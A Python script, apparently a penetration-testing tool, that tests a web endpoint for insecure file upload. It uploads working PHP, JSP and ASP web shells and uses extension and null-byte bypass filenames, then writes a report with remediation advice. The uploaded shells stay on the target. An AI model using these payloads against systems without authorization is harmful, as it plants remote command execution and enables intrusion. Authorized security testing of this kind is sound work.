#!/usr/bin/env python3
"""
File Upload Vulnerability Tester
Tests for insecure file upload vulnerabilities.
"""

import sys
import requests
import os
from typing import List, Dict

class FileUploadTester:
    def __init__(self, url: str):
        self.url = url
        self.vulnerable = False
        self.test_files = {
            'php_shell': ('shell.php', '<?php system($_GET["cmd"]); ?>'),
            'jsp_shell': ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            'asp_shell': ('shell.asp', '<% eval request("cmd") %>'),
            'exe_file': ('test.exe', b'MZ\x90\x00'),
            'double_ext': ('test.php.jpg', '<?php phpinfo(); ?>'),
            'null_byte': ('test.php\x00.jpg', '<?php phpinfo(); ?>')
        }
    
    def test_file_upload(self, param: str = 'file') -> bool:
        """Test file upload functionality"""
        print(f"[*] Testing file upload on {self.url}...")
        
        for file_type, (filename, content) in self.test_files.items():
            try:
                files = {param: (filename, content)}
                response = requests.post(self.url, files=files, timeout=10)
                
                # Check if file was uploaded
                if response.status_code == 200:
                    # Try to access uploaded file
                    uploaded_url = f"{self.url.rstrip('/')}/uploads/{filename}"
                    access_response = requests.get(uploaded_url, timeout=5)
                    
                    if access_response.status_code == 200:
                        print(f"[+] File upload successful: {filename}")
                        self.vulnerable = True
                        return True
            except Exception as e:
                print(f"[-] Error testing {filename}: {e}")
        
        return False
    
    def test_file_type_validation(self) -> Dict:
        """Test file type validation"""
        print("[*] Testing file type validation...")
        
        results = {
            'bypasses': []
        }
        
        # Test various bypass techniques
        bypass_techniques = [
            ('shell.php.jpg', 'image/jpeg'),
            ('shell.php%00.jpg', 'image/jpeg'),
            ('shell.php;.jpg', 'image/jpeg'),
            ('shell.php ', 'image/jpeg')
        ]
        
        for filename, content_type in bypass_techniques:
            try:
                files = {'file': (filename, '<?php phpinfo(); ?>')}
                response = requests.post(
                    self.url,
                    files=files,
                    headers={'Content-Type': content_type},
                    timeout=10
                )
                
                if response.status_code == 200:
                    results['bypasses'].append(filename)
            except:
                pass
        
        return results
    
    def generate_report(self) -> str:
        """Generate file upload test report"""
        report = f"# File Upload Vulnerability Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: File upload vulnerability detected!\n\n"
        else:
            report += "✅ No file upload vulnerability detected.\n\n"
        
        report += "## Tested File Types\n\n"
        for file_type, (filename, _) in self.test_files.items():
            report += f"- {filename} ({file_type})\n"
        report += "\n"
        
        report += "## Common File Upload Vulnerabilities\n\n"
        report += "1. **No File Type Validation**: Accepts any file type\n"
        report += "2. **Client-Side Only Validation**: Bypassable validation\n"
        report += "3. **Double Extension**: test.php.jpg bypass\n"
        report += "4. **Null Byte Injection**: test.php\\x00.jpg\n"
        report += "5. **Content-Type Bypass**: Changing MIME type\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Validate file types server-side\n"
        report += "2. Use whitelist of allowed extensions\n"
        report += "3. Scan uploaded files for malware\n"
        report += "4. Store files outside web root\n"
        report += "5. Rename uploaded files\n\n"
        
        return report

def main():
    if len(sys.argv) < 2:
        print("Usage: python file_upload_tester.py <url> [parameter]")
        print("Example: python file_upload_tester.py http://example.com/upload file")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'file'
    
    tester = FileUploadTester(url)
    tester.test_file_upload(param)
    
    report = tester.generate_report()
    
    filename = "file_upload_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] File upload testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()


